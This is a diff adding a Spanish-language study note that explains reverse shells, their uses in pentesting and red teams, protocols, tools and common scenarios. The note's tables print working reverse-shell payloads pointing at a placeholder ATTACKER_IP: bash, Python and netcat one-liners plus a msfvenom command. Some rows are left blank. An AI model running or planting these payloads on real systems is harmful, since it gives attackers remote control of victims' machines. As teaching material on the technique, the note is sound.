@@ -1,0 +1,83 @@
+Un reverse shell (o shell inversa) es una conexión remota en la que la víctima se conecta al atacante, y no al revés.
+
+    > Normalmente, en una shell tradicional (bind shell), el atacante se conecta directamente al puerto abierto de la máquina víctima.
+    > En un reverse shell, la máquina víctima inicia la conexión hacia la máquina del atacante, lo que ayuda a evadir firewalls y NAT.
+
+
+¿Para qué se usa?
+
+    En informática y ciberseguridad, un reverse shell se utiliza principalmente en pentesting y red team para:
+    
+        > Obtener acceso remoto a un sistema comprometido.
+        > Ejecutar comandos en la máquina víctima como si el atacante estuviera en su terminal.
+        > Evadir restricciones de seguridad (firewalls que bloquean conexiones entrantes pero permiten salientes).
+        > Post-explotación: moverse lateralmente por la red, robar datos, escalar privilegios.
+    
+    En resumen: es una forma de controlar una máquina de manera remota tras comprometerla.
+
+
+Opciones y tipos de Reverse Shell
+
+
+
+
+Existen muchas formas y herramientas para generar un reverse shell dependiendo del entorno de la víctima y de la configuración de red.
+
+    1. Según el protocolo
+        -------------------------------------------------------------------------------------------------
+        |  TCP Reverse Shell       |  el más común, estable y confiable.                                |
+        -------------------------------------------------------------------------------------------------
+        |  UDP Reverse Shell       |  menos común, más sigiloso en algunos casos.                       |
+        -------------------------------------------------------------------------------------------------
+        |  ICMP/DNS Reverse Shell  |  muy avanzados, usados para evadir detecciones (covert channels).  |
+        -------------------------------------------------------------------------------------------------
+
+    2. Según el lenguaje o herramienta usada
+
+        Un reverse shell puede generarse en distintos lenguajes o binarios presentes en la máquina víctima:
+        -------------------------------------------------------------------------------------------------
+        |  Bash                    |  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1                         |
+        -------------------------------------------------------------------------------------------------
+        |  Python                  |  import socket,subprocess,os                                       |
+        |                          |  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)                |
+        |                          |  s.connect(("ATTACKER_IP",4444))                                   |
+        |                          |  os.dup2(s.fileno(),0)                                             |
+        |                          |  os.dup2(s.fileno(),1)                                             |
+        |                          |  os.dup2(s.fileno(),2)                                             |
+        |                          |  subprocess.call(["/bin/sh"])                                      |
+        -------------------------------------------------------------------------------------------------
+        |  Perl                    |                                                                    |
+        -------------------------------------------------------------------------------------------------
+        |  PHP                     |                                                                    |
+        -------------------------------------------------------------------------------------------------
+        |  Ruby                    |                                                                    |
+        -------------------------------------------------------------------------------------------------
+        |  Netcat (nc)             |  nc -e /bin/sh ATTACKER_IP 4444                                    |
+        -------------------------------------------------------------------------------------------------
+
+    3. Herramientas especializadas
+        -------------------------------------------------------------------------------------------------
+        |  Metasploit Framework    |  Permite generar payloads con msfvenom para reverse shells en      |
+        |                          |  múltiples plataformas.                                            |
+        |                          |                                                                    |
+        |                          |  Ejemplo: msfvenom -p linux/x86/shell_reverse_tcp                  |
+        |  Ejemplo:                |  LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf                   |
+        |                          |                                                                    |
+        -------------------------------------------------------------------------------------------------  
+        |  Nishang (PowerShell reverse shells en Windows).                                              |
+        -------------------------------------------------------------------------------------------------   
+        |  Empire / Covenant (post-explotación en entornos Windows).                                    |
+        -------------------------------------------------------------------------------------------------
+
+
+Escenarios comunes
+
+    > Pentester explota una vulnerabilidad web → sube un script PHP con un reverse shell.
+    > Empleado descarga un archivo malicioso que abre una conexión hacia el atacante.
+    > Red Team usa ingeniería social para ejecutar un payload que levanta un reverse shell en Windows/Linux.
+
+
+Resumen
+
+    Un reverse shell es una técnica clave en ciberseguridad ofensiva para tomar control de un sistema de manera remota, saltarse restricciones de red y moverse en un 
+    entorno comprometido.
